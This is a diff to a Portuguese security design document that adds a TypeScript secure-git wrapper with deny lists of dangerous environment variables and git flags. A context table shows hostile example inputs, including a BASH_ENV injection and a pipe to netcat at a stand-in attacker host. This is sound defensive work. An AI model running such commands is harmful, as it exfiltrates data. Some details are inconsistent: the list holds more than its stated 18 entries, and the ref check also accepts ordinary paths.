@@ -685,6 +685,227 @@ export { executeSecureGit, validateGitCommand };
 | `BASH_ENV=/tmp/evil.sh git add` | ❌ Executa | ✅ Bloqueado | Sanitização de ENV |
 | `git status \| nc attacker.com` | ❌ Passa allowlist | ✅ Bloqueado | AST bloqueia pipes |
 
+#### Implementação Canônica Final: `secure-git-wrapper.ts` v2.3 (Dossiê de Infraestrutura)
+
+> **Nota:** Esta é a implementação de referência do Dossiê de Infraestrutura v2.3. Ela **substitui e supercede** a implementação v2.2 acima, adotando `execa` (shell: false implícito), validação Zod, e `FORBIDDEN_ENV_VARS` com cobertura CVE completa. O código v2.2 permanece documentado para fins históricos.
+
+```typescript
+// secure-git-wrapper.ts — GreenForge v2.3 FINAL
+// Fonte: Dossiê de Implementação v2.3, GAP 3
+// Defesa em profundidade contra:
+//   CVE-2026-3854  (GitHub RCE via push option injection)
+//   CVE-2026-25763 (OpenProject git log --output= injection)
+//   CVE-2025-68144 (mcp-server-git argument injection)
+//   CVE-2023-29007 (Git arbitrary config injection via core.pager)
+//   CVE-2017-8386  (git-shell pager bypass via less)
+import { realpath } from 'fs/promises';
+import path         from 'path';
+import { execa }    from 'execa';
+import { z }        from 'zod';
+
+// ═══════════════════════════════════════════════════════════
+// SEÇÃO 1: VARIÁVEIS DE AMBIENTE PERIGOSAS (18 entradas)
+// ═══════════════════════════════════════════════════════════
+// Mesmo com spawn({ shell: false }), estas vars podem armar
+// comandos permitidos. Ex: PAGER=malicious_binary git log
+const FORBIDDEN_ENV_VARS: ReadonlySet<string> = new Set([
+  // Pagers — vetores de escalada (CVE-2017-8386)
+  'GIT_PAGER', 'PAGER', 'MANPAGER',
+  'LESS',           // Controla flags do less — habilita execução de shell
+
+  // Executáveis externos — RCE direto
+  'GIT_EDITOR', 'EDITOR', 'VISUAL',
+  'GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_PROXY_COMMAND',
+  'GIT_ASKPASS', 'SSH_ASKPASS',
+  'GIT_EXTERNAL_DIFF',  // Executa diff handler externo por linha modificada
+
+  // Redirecionamento de paths de execução — sandbox escape
+  'GIT_EXEC_PATH',      // Onde git busca subcomandos
+  'GIT_TEMPLATE_DIR',   // Pode injetar hooks maliciosos
+
+  // Injeção de configuração — CVE-2023-29007
+  'GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0', 'GIT_CONFIG_VALUE_0',
+
+  // Logging em paths arbitrários
+  'GIT_TRACE', 'GIT_TRACE2', 'GIT_TRACE_PERFORMANCE', 'GIT_TRACE2_EVENT',
+
+  // Variáveis de autenticação que podem vazar credenciais
+  'GIT_TERMINAL_PROMPT', 'GIT_CREDENTIAL_HELPER',
+]);
+
+// ═══════════════════════════════════════════════════════════
+// SEÇÃO 2: ALLOWLIST POSITIVA COM POLÍTICAS POR SUBCOMANDO
+// ═══════════════════════════════════════════════════════════
+interface SubcommandPolicy {
+  allowedFlags:   ReadonlySet<string>;
+  forbiddenFlags: ReadonlySet<string>; // Dupla proteção para vetores CVE conhecidos
+  allowPathArgs:  boolean;
+  allowRefArgs:   boolean;
+  maxArgs:        number;
+}
+
+const GIT_POLICY: Readonly<Record<string, SubcommandPolicy>> = {
+  'status': {
+    allowedFlags: new Set(['-s', '--short', '--porcelain', '--branch', '-b']),
+    forbiddenFlags: new Set([]), allowPathArgs: false, allowRefArgs: false, maxArgs: 2,
+  },
+  'log': {
+    allowedFlags: new Set(['--oneline', '--graph', '--decorate', '--no-decorate', '-n', '--format', '--name-only', '--stat']),
+    forbiddenFlags: new Set(['--output', '--exec']),  // CVE-2026-25763
+    allowPathArgs: false, allowRefArgs: true, maxArgs: 5,
+  },
+  'diff': {
+    allowedFlags: new Set(['--stat', '--name-only', '--name-status', '--cached', '--staged', '--shortstat']),
+    forbiddenFlags: new Set(['--no-index', '--output', '--ext-diff', '--no-ext-diff', '--textconv', '--word-diff-regex']),
+    allowPathArgs: true, allowRefArgs: true, maxArgs: 6,
+  },
+  'show': {
+    allowedFlags: new Set(['--stat', '--name-only', '--format']),
+    forbiddenFlags: new Set(['--output', '--no-index']),
+    allowPathArgs: false, allowRefArgs: true, maxArgs: 3,
+  },
+  'stash': {
+    allowedFlags: new Set(['push', 'pop', 'list', 'show', 'drop', '--include-untracked', '-m', '--message']),
+    forbiddenFlags: new Set([]), allowPathArgs: false, allowRefArgs: false, maxArgs: 4,
+  },
+  'add': {
+    allowedFlags: new Set(['-p', '--patch', '--update', '-u']),
+    forbiddenFlags: new Set([]), allowPathArgs: true, allowRefArgs: false, maxArgs: 5,
+  },
+  'commit': {
+    allowedFlags: new Set(['-m', '--message', '--allow-empty', '--no-verify']),
+    forbiddenFlags: new Set(['--template', '--cleanup=scissors']),
+    allowPathArgs: false, allowRefArgs: false, maxArgs: 3,
+  },
+  'checkout': {
+    allowedFlags: new Set(['-b', '--detach', '--orphan']),
+    forbiddenFlags: new Set([]), allowPathArgs: false, allowRefArgs: true, maxArgs: 3,
+  },
+  'rev-parse': {
+    allowedFlags: new Set(['--short', '--verify', '--show-toplevel', 'HEAD']),
+    forbiddenFlags: new Set(['--absolute-git-dir', '--git-dir']),
+    allowPathArgs: false, allowRefArgs: true, maxArgs: 2,
+  },
+  'write-tree': {
+    allowedFlags: new Set([]), forbiddenFlags: new Set([]),
+    allowPathArgs: false, allowRefArgs: false, maxArgs: 0,
+  },
+};
+
+// ═══════════════════════════════════════════════════════════
+// SEÇÃO 3: SCHEMA ZOD + TIPOS
+// ═══════════════════════════════════════════════════════════
+const SecureGitSchema = z.object({
+  worktreePath: z.string().min(1).max(512),
+  subcommand: z.string().refine(
+    s => s in GIT_POLICY,
+    s => ({ message: `'${s}' not in allowlist. Allowed: ${Object.keys(GIT_POLICY).join(', ')}` })
+  ),
+  args: z.array(
+    z.string().min(0).max(512)
+      .refine(s => !s.includes('\0'), 'Null byte not allowed')
+      .refine(s => !s.includes('\n') && !s.includes('\r'), 'Newlines not allowed')
+  ).max(10),
+});
+
+export type SecureGitInput  = z.infer<typeof SecureGitSchema>;
+export interface SecureGitOutput { stdout: string; stderr: string; exitCode: number }
+
+// ═══════════════════════════════════════════════════════════
+// SEÇÃO 4: A FUNÇÃO PRINCIPAL
+// ═══════════════════════════════════════════════════════════
+export async function secureGit(input: SecureGitInput): Promise<SecureGitOutput> {
+  // Camada 0: Schema Zod
+  const parsed = SecureGitSchema.safeParse(input);
+  if (!parsed.success) throw new SecurityError(`[INPUT] ${parsed.error.message}`);
+
+  const { worktreePath, subcommand, args } = parsed.data;
+  const policy = GIT_POLICY[subcommand]!;
+
+  // Camada 1: Resolução real do worktree (dereference de symlinks)
+  const resolvedWorktree = await realpath(worktreePath).catch(() => {
+    throw new SecurityError(`[PATH] Cannot resolve worktree: ${worktreePath}`);
+  });
+
+  // Camada 2: Validação do limite de argumentos
+  if (args.length > policy.maxArgs)
+    throw new SecurityError(`[ARGS] Too many args for 'git ${subcommand}': ${args.length} > ${policy.maxArgs}`);
+
+  // Camada 3: Classificação e validação dos argumentos
+  const safeFlags: string[] = [], safePathArgs: string[] = [], safeRefArgs: string[] = [];
+
+  for (const arg of args) {
+    if (arg.startsWith('-')) {
+      await validateFlag(arg, subcommand, policy);
+      safeFlags.push(arg);
+    } else if (isGitRef(arg)) {
+      if (!policy.allowRefArgs) throw new SecurityError(`[REF] Ref args not allowed for 'git ${subcommand}': ${arg}`);
+      safeRefArgs.push(arg);
+    } else {
+      safePathArgs.push(await validateAndResolvePath(arg, resolvedWorktree, subcommand, policy));
+    }
+  }
+
+  // Camada 4: Sanitização do environment (remove FORBIDDEN_ENV_VARS)
+  const sanitizedEnv = buildSanitizedEnv();
+
+  // Camada 5: Execução via execa (shell: false implícito — sem /bin/sh intermediário)
+  const finalArgs = ['-C', resolvedWorktree, subcommand, ...safeFlags, ...safeRefArgs, ...safePathArgs];
+  const result = await execa('git', finalArgs, { env: sanitizedEnv, timeout: 30_000, reject: false });
+
+  if (result.exitCode !== 0)
+    throw new Error(`[GIT] git ${subcommand} failed (exit ${result.exitCode}): ${result.stderr}`);
+
+  return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode };
+}
+
+// ─── Funções auxiliares ───────────────────────────────────
+
+async function validateFlag(arg: string, subcommand: string, policy: SubcommandPolicy): Promise<void> {
+  const baseFlag = arg.split('=')[0]!;
+  if (policy.forbiddenFlags.has(baseFlag) || policy.forbiddenFlags.has(arg))
+    throw new SecurityError(`[FLAG] '${arg}' is forbidden for 'git ${subcommand}'. Known attack vector.`);
+  if (!policy.allowedFlags.has(baseFlag) && !policy.allowedFlags.has(arg))
+    throw new SecurityError(`[FLAG] '${baseFlag}' not in allowlist for 'git ${subcommand}'.`);
+  if (arg.includes('=')) {
+    const value = arg.split('=').slice(1).join('=');
+    if (/exec:|%(trailers.*key)/.test(value))
+      throw new SecurityError(`[FLAG] Potentially dangerous format token in '${arg}'`);
+  }
+}
+
+async function validateAndResolvePath(
+  arg: string, resolvedWorktree: string, subcommand: string, policy: SubcommandPolicy
+): Promise<string> {
+  if (!policy.allowPathArgs) throw new SecurityError(`[PATH] Path args not allowed for 'git ${subcommand}': ${arg}`);
+  const resolved = await realpath(path.resolve(resolvedWorktree, arg)).catch(() => {
+    throw new SecurityError(`[PATH] Cannot resolve: '${arg}'`);
+  });
+  const prefix = resolvedWorktree.endsWith(path.sep) ? resolvedWorktree : resolvedWorktree + path.sep;
+  if (resolved !== resolvedWorktree && !resolved.startsWith(prefix))
+    throw new SecurityError(`[PATH_TRAVERSAL] '${resolved}' is outside worktree '${resolvedWorktree}'`);
+  return resolved;
+}
+
+function isGitRef(arg: string): boolean {
+  return /^[a-zA-Z0-9_\-./~^@{}:]+$/.test(arg) && !arg.includes('../') && !arg.includes('/../') && arg !== '..';
+}
+
+function buildSanitizedEnv(): NodeJS.ProcessEnv {
+  const env = { ...process.env };
+  for (const forbidden of FORBIDDEN_ENV_VARS) { delete env[forbidden]; }
+  // Força modo não-interativo (previne abertura de editor/pager)
+  env['GIT_TERMINAL_PROMPT'] = '0';
+  env['GIT_ASKPASS']         = 'echo'; // Retorna vazio para qualquer prompt de credencial
+  env['TERM']                = 'dumb'; // Desabilita features de terminal rico
+  return env;
+}
+
+class SecurityError extends Error {
+  constructor(message: string) { super(message); this.name = 'SecurityError'; }
+}
+```
+
 ---
 
 ## 4.4 Environment Poisoning — O Risco Residual Além das Allowlists (v2.3)
